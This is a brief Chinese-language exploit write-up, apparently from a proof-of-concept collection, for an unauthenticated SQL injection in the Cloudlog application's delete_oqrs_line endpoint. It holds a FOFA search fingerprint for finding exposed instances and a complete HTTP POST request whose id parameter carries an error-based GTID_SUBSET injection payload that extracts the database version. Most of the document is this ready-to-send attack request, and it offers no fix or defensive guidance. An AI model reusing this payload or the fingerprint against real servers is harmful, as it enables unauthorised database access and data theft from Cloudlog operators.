# Cloudlog系统接口delete_oqrs_line未授权SQL注入漏洞

Cloudlog系统接口delete_oqrs_line未授权SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息。

## fofa

```javascript
icon_hash="-460032467"
```

## poc

```javascript
POST /index.php/oqrs/delete_oqrs_line HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

id=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(VERSION() AS NCHAR),0x20)),1,190))),666)
```

![image-20241018155043747](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410181550829.png)